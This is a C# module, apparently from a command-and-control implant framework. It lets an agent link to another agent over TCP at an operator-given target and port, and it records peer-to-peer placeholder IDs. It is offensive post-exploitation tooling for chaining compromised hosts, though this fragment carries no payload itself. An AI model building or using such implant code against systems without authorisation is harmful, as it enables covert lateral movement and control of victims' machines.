using Agent.Comms;
using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System.Collections.Generic;

namespace Agent.Modules
{
    public class LinkModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Link",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "TCP",
                        Delegate = LinkTCPAgent
                    },
                    new ModuleInfo.Command
                    {
                        Name ="Link0Response",
                        Delegate = Link0Response
                    }
                }
            };
        }

        void LinkTCPAgent(string AgentID, AgentTask Task)
        {
            var target = (string)Task.Parameters["Target"];
            var port = (int)Task.Parameters["Port"];

            var commModule = new TCPCommModule(target, port);
            
            Agent.AddP2PAgent(commModule);
        }

        void Link0Response(string AgentID, AgentTask Task)
        {
            var placeholder = (string)Task.Parameters["Placeholder"];
            var agentID = (string)Task.Parameters["AgentID"];

            Agent.UpdateP2PPlaceholder(placeholder, agentID);
        }
    }
}